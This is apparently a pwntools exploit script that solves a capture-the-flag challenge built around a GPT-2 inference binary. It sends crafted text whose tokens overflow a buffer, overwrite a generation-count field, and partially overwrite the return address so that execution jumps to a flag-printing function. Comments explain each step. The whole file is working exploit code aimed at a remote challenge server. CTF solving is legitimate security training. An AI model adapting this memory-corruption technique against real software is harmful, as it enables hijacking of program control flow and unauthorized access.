#!/usr/bin/env python3

from pwn import *

exe = ELF("./gpt2")

context.binary = exe

GDB_SCRIPT = """
b gpt2.cpp:953
c"""


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], GDB_SCRIPT)
    else:
        r = remote("challs.pwnoh.io", 13418)

    return r


def get_random_ascii_bytes(length):
    return bytes([random.randint(0x20, 0x7E) for _ in range(length)])


# generated by testing various random ascii strings locally until 68 tokens are generated (enough to reach the genT field)
BASE_PAYLOAD = b'gRyolq-P+bF7b"N<_/PUA\'M*!a73.<D0$#J"=|I&LeJp&8!{y%jo?):6 l3{_KLjO^5N8mM;}zanaSH?A'

# need the token that overwrites genT to remain a small value so the program doesn't run forever.
# a value less than 64 is even better so the program thinks it's done and exits immediately!
GEN_T_OVERWIRTE = b"?"

# need to reach the return address, but stop one token short (you'll see why)
PADDING = b"A?B!C?"

# now we overwrite the two low bytes of the return address to point to the flag function.
# the flag function's low bytes are 0x1f70, so we need to push a token with that value.
# you can recompile the source code to find this value like this:
#
# GPT2 model = GPT2("gpt2_124M.bin", "gpt2_tokenizer.bin");
# printf("---\n<%s>\n---\n", model.tokenizer.decode_token(0x1f70));
#
# however, this string only tokenizes to that value the second time it's seen,
# so we need to send it twice (see below)

FLAG_TOKEN = b"Down"


def main():
    r = conn()

    r.recvuntil(b"proof")
    print(r.recvline())
    print(r.recvline())
    token = input()
    r.sendline(token.encode())

    payload = BASE_PAYLOAD + GEN_T_OVERWIRTE + PADDING + FLAG_TOKEN + FLAG_TOKEN + b"\n"
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
